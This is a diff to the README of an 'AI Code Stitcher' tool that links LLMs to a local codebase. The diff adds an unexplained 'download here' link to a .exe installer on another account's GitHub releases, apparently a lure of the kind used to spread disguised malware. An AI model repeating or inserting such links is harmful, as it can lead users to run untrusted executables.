@@ -1,3 +1,5 @@
+download here: https://github.com/ue-patcher/Code_Stitcher/releases/download/v2.71/code_stitcher_setup_v2.71.exe
+
 # AI Code Stitcher & Stitch Viewer
 
 Welcome to **AI Code Stitcher**, the ultimate bridge between Large Language Models (like ChatGPT, Claude, or DeepSeek) and your local codebase. 
